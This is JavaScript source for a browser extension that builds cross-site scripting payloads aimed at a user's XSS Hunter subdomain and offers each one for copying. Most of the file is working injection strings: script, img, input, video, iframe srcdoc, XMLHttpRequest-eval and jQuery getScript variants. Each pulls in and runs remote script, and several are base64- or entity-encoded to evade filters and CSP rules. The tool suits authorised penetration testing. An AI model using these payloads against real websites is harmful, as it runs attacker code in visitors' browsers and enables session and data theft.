//Check if a payload was previously stored
chrome.storage.sync.get('xssHunterSubdomain', function (answer) {
	subdomain = answer.xssHunterSubdomain;
	if (subdomain !== null) {
		$('#subdomain').val(subdomain);
		setPayloads(subdomain);
	}
})

//An array of objects
//Each object contains a title and a payload
var payloads = [{
	title: ' <label><code>&lt;script&gt;</code> Tag Payload</label> - Basic XSS payload.<br>',
	payload: function (subdomain) {
		return '"><script src=https://' + subdomain + '></script>';
	}
}, {
	title: '<label><code>javascript:</code> URI Payload</label> - For use where URI\'s are taken as input. <br> ',
	payload: function (subdomain) {
		return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + subdomain + "\\';document.body.appendChild(a)')";
	}
}, {
	title: '<label for="input_tag_payload"><code>&lt;input&gt;</code> Tag Payload</label> - For bypassing poorly designed blacklist systems with the HTML5 <code>autofocus</code> attribute.<br>',
	payload: function (subdomain) {
		var temp = 'var a=document.createElement("script");a.src="https://' + subdomain + '";document.body.appendChild(a);'
		temp = btoa(temp);
		//html encode
		temp = htmlEncode(temp);
		return '"><input onfocus=eval(atob(this.id)) id=' + temp + ' autofocus>';
	}
}, {
	title: '<label for="img_tag_payload"><code>&lt;img&gt;</code> Tag Payload</label> - Another basic payload for when <code>&lt;script&gt;</code> tags are explicitly filtered.<br>',
	payload: function (subdomain) {
		var temp = 'var a=document.createElement("script");a.src="https://' + subdomain + '";document.body.appendChild(a);'
		temp = btoa(temp);
		//html encode
		temp = htmlEncode(temp);
		return '"><img src=x id=' + temp + ' onerror=eval(atob(this.id))>';
	}
}, {
	title: '<label for="source_tag_payload"><code>&lt;video&gt;&lt;source&gt;</code> Tag Payload</label> - HTML5 payload, only works in Firefox, Chrome and Opera<br>',
	payload: function (subdomain) {
		var temp = 'var a=document.createElement("script");a.src="https://' + subdomain + '";document.body.appendChild(a);'
		temp = btoa(temp);
		//html encode
		temp = htmlEncode(temp);
		return '"><video><source onerror=eval(atob(this.id)) id=' + temp + '>';
	}
}, {
	title: '<label for="srcdoc_tag_payload"><code>&lt;iframe srcdoc=</code> Tag Payload</label> - HTML5 payload, only works in Firefox, Chrome and Opera<br>',
	payload: function (subdomain) {
		var temp = '<script>var a=parent.document.createElement("script");a.src="https://' + subdomain + '";parent.document.body.appendChild(a);</script>;'
		temp = htmlEncodeFull(temp);
		return '"><iframe srcdoc="' + temp + '">';
	}
}, {
	title: '<label for="xhr_payload"><code>XMLHTTPRequest</code> Payload</label> - For exploitation of web applications with Content Security Policies containing <code>script-src</code> but have <code>unsafe-inline</code> enabled.<br>',
	payload: function (subdomain) {
		return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + subdomain + '");a.send();</script>';
	}
}, {
	title: '<label for="getscript_payload"><code>$.getScript()</code> Payload</label> - Example payload for sites that include JQuery<br>',
	payload: function (subdomain) {
		return '<script>$.getScript("//' + subdomain + '")</script>';
	}
}];

//Encode every character in its HTML Entity equivalent
function htmlEncodeFull(payload) {
	return payload.replace(/./gm, function (s) {
		return "&#" + s.charCodeAt(0) + ";";
	});
}

//Get the copy payload button
function getButton(payload) {
	return '<button type="button" data="' + htmlEncode(payload) + '" class="btn btn-info btn-block payloadCopy"><span class="glyphicon glyphicon-share"></span> Copy Payload to Clipboard</button>';
}

//Get the payload input
function getInput(payload) {
	return '<input type="text" class="form-control payloadInput" value="' + htmlEncode(payload) + '">';
}

//Simple html encoding for displaying payloads
//This is not a regex for preventing XSS
function htmlEncode(payload) {
	return payload.replace(/&/g, "&amp;").replace(/>/g, "&gt;").replace(/</g, "&lt;").replace(/"/g, "&quot;");
}

//Add the given payload with the given subdomain
function addPayload(payload, subdomain) {
	var payloadString = payload.payload(subdomain);
	var button = getButton(payloadString);
	var input = getInput(payloadString);
	$('#payloads').append(payload.title + input + button);
}

//Update payloads when subdomain is changed
$('#subdomain').on('change textInput input', function () {
	var subdomain = $('#subdomain').val();
	chrome.storage.sync.set({
		'xssHunterSubdomain': subdomain
	});
	$('#payloads').html('');
	setPayloads(subdomain)
})

//Set all payloads for the given subdomain
function setPayloads(subdomain) {
	//All xsshunter files should be servable over https, so remove all protocols and allow the injection strings to add protocol.
	if (subdomain.indexOf('http://') > -1 || subdomain.indexOf('https://') > -1) {
		subdomain = subdomain.split('//')[1];
	}
	for (var i = 0; i < payloads.length; i++) {
		addPayload(payloads[i], subdomain);
	}
	$('.payloadCopy').click(function (e, el) {
		//Just for assurance that it is copied.
		copyTextToClipboard(e.target.attributes.data.nodeValue);
		copyTextToClipboard(e.target.attributes.data.nodeValue);
		copyTextToClipboard(e.target.attributes.data.nodeValue);
	})

	//Issues with DOM not refreshing so new click handlers aren't there, this fixes that
	$(window).trigger('resize');
}


// Copy provided text to the clipboard.
function copyTextToClipboard(text) {
	var copyFrom = $('<textarea id="copyTextArea"/>');
	copyFrom.text(text);
	$('body').append(copyFrom);
	copyFrom.select();
	document.execCommand('copy');
	copyFrom.remove();
}
